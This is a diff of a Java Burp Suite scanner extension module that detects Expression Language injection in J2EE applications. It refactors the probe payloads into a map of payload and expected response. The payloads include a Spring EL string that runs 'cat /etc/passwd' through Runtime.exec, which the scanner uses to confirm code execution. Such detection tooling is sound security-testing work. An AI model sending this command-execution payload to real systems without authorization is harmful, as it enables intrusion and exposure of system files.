@@ -1,12 +1,12 @@
 package burp.j2ee.issues.impl;
 
+import burp.HTTPMatcher;
 import static burp.HTTPMatcher.getMatches;
+import static burp.HTTPMatcher.isJavaApplicationByURL;
 import burp.IBurpExtenderCallbacks;
 import burp.IExtensionHelpers;
 import burp.IHttpRequestResponse;
-import burp.IParameter;
 import burp.IRequestInfo;
-import burp.IResponseInfo;
 import burp.IScanIssue;
 import burp.IScannerInsertionPoint;
 import burp.j2ee.Confidence;
@@ -16,9 +16,10 @@ import burp.j2ee.issues.IModule;
 
 import java.net.URL;
 import java.util.ArrayList;
-import java.util.Arrays;
+import java.util.HashMap;
 import java.util.List;
 import java.util.Random;
+import java.util.Set;
 
 /**
  *
@@ -56,25 +57,20 @@ public class ELInjection implements IModule {
         // Execute a basic algorithm operation to detect OGNL code execution
         int MAX_RANDOM_INT = 500;
         Random rand = new Random();
-        int firstInt = rand.nextInt(MAX_RANDOM_INT) + 2;
-        int secondInt = rand.nextInt(MAX_RANDOM_INT) + 2;
-        String multiplication = Integer.toString(firstInt * secondInt);
+        final int firstInt = rand.nextInt(MAX_RANDOM_INT) + 2;
+        final int secondInt = rand.nextInt(MAX_RANDOM_INT) + 2;
+        final String multiplication = Integer.toString(firstInt * secondInt);
 
-        List<byte[]> EL_INJECTION_TESTS = Arrays.asList(
-                "${applicationScope}".getBytes(),
-                "#{applicationScope}".getBytes(),
-                String.format("${%d*%d}", firstInt, secondInt).getBytes(),
-                String.format("#{%d*%d}", firstInt, secondInt).getBytes(),
-                // To detect Sring EL eval <spring:eval expression="${param.msg}" />
-                "(new+java.util.Scanner((T(java.lang.Runtime).getRuntime().exec(\"cat+/etc/passwd\").getInputStream()),\"UTF-8\")).useDelimiter(\"\\\\A\").next()".getBytes()
-        );
+        byte[] EL_TEST = "(new+java.util.Scanner((T(java.lang.Runtime).getRuntime().exec(\"cat+/etc/passwd\").getInputStream()),\"UTF-8\")).useDelimiter(\"\\\\A\").next()".getBytes();
 
-        List<byte[]> GREP_STRINGS;
-        GREP_STRINGS = Arrays.asList(
-                "javax.servlet.context".getBytes(),
-                multiplication.getBytes(),
-                "root:".getBytes()
-        );
+        HashMap<byte[], byte[]> EL_INJECTIONS = new HashMap<byte[], byte[]>() {
+            {
+                put("${applicationScope}".getBytes(), "javax.servlet.context".getBytes());
+                put("#{applicationScope}".getBytes(), "javax.servlet.context".getBytes());
+                put(String.format("${%d*%d}", firstInt, secondInt).getBytes(), multiplication.getBytes());
+                put(String.format("#{%d*%d}", firstInt, secondInt).getBytes(), multiplication.getBytes());
+            }
+        };
 
         IExtensionHelpers helpers = callbacks.getHelpers();
         List<IScanIssue> issues = new ArrayList<>();
@@ -82,41 +78,59 @@ public class ELInjection implements IModule {
         URL curURL = reqInfo.getUrl();
 
         // Skip test for not j2ee applications
-        if (curURL.getPath()
-                .contains(".php")
-                || curURL.getPath().contains(".asp")
-                || curURL.getPath().contains(".cgi")
-                || curURL.getPath().contains(".pl")) {
+        if (!isJavaApplicationByURL(curURL)){
             return issues;
         }
 
-        for (byte[] INJ_TEST : EL_INJECTION_TESTS) {
+
+        Set<byte[]> EL_INJECTION_LIST = EL_INJECTIONS.keySet();
+
+        for (byte[] INJ_TEST : EL_INJECTION_LIST) {
+
             // make a request containing our injection test in the insertion point
             byte[] checkRequest = insertionPoint.buildRequest(INJ_TEST);
             IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                     baseRequestResponse.getHttpService(), checkRequest);
 
             // look for matches of our active check grep string
-            for (byte[] GREP_STRING : GREP_STRINGS) {
+            List<int[]> matches = getMatches(checkRequestResponse.getResponse(), EL_INJECTIONS.get(INJ_TEST), helpers);
+            if (matches.size() > 0) {
 
-                List<int[]> matches = getMatches(checkRequestResponse.getResponse(), GREP_STRING, helpers);
-                if (matches.size() > 0) {
-
-                    issues.add(new CustomScanIssue(
-                            baseRequestResponse.getHttpService(),
-                            reqInfo.getUrl(),
-                            checkRequestResponse,
-                            TITLE,
-                            DESCRIPTION,
-                            REMEDY,
-                            Risk.High,
-                            Confidence.Tentative
-                    ));
-                }
-
+                issues.add(new CustomScanIssue(
+                        baseRequestResponse.getHttpService(),
+                        reqInfo.getUrl(),
+                        checkRequestResponse,
+                        TITLE,
+                        DESCRIPTION,
+                        REMEDY,
+                        Risk.High,
+                        Confidence.Tentative
+                ));
+                
             }
+        }
+
+        
+        // make a request containing our injection test in the insertion point
+        byte[] checkELRequest = insertionPoint.buildRequest(EL_TEST);
+
+        IHttpRequestResponse checkELRequestResponse = callbacks.makeHttpRequest(
+                baseRequestResponse.getHttpService(), checkELRequest);
+
+        if (HTTPMatcher.isEtcPasswdFile(checkELRequestResponse.getResponse(), helpers)) {
+            issues.add(new CustomScanIssue(
+                    baseRequestResponse.getHttpService(),
+                    reqInfo.getUrl(),
+                    checkELRequestResponse,
+                    TITLE,
+                    DESCRIPTION,
+                    REMEDY,
+                    Risk.High,
+                    Confidence.Tentative
+            ));
         }
 
         return issues;
     }
+
 }
